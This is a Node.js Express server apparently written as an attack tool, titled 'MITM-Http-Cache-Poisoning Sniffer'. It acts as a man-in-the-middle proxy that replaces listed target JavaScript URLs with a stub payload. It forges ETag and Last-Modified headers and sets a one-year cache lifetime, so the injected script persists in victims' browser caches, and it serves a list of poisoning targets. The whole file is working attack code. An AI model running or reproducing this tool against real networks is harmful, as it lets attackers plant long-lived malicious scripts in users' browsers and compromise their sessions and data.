/**
 * MITM-Http-Cache-Poisoning Sniffer
 *   @update 2015/04/30
 *   @author EtherDream
 */
var fs = require('fs');
var express = require('express');
var app = express();


// 缓存列表
var mTargetMap = require('./asset/target.json');
var mListBuf = new Buffer( Object.keys(mTargetMap).join('\n') );

// 缓存内容
var mStub = fs.readFileSync('./asset/stub.js', 'utf8');

// 开启服务
app.listen(8080, function() {
    console.log('running...');
});

// 清理绝对路径（正向代理时 GET http://...）
app.use(function(req, res, next) {
    var m = req.url.match(/^http:\/\/[^/]*(.*)/i);
    if (m) {
        req.url = m[1];
    }
    next();
});

// 缓存列表
app.get('/__get_poisoning_list__', function(req, res, next) {
    res.send(mListBuf);
});

// 缓存内容
app.use(function(req, res, next) {
    var reqhd = req.headers;
    var url = reqhd['host'] + req.path;

    // 请求缓存列表?
    var target = mTargetMap[url];
    if (!target) {
        return next();
    }

    // 响应内容
    var buf = target._buf;
    if (!buf) {
        buf = mStub
            .replace('%CHAR', target.charset || '')
            .replace('%URL', url);
        buf = target._buf = new Buffer(buf);
    }

    // 响应头
    var reshd = {
        'Content-Type': 'text/javascript',
        'Content-Length': buf.length,
        'Cache-Control': 'max-age=31536000'
    };
    if (target.modify) {
        reshd['Last-Modified'] = target.modify;
    }
    if (target.etag) {
        reshd['ETag'] = target.etag;
    }

    // 发送
    res.writeHead(200, reshd);
    res.end(buf);
});


// 测试（访问任意页面）
app.use(function(req, res, next) {
    res.sendFile(__dirname + '/asset/test.html');
});
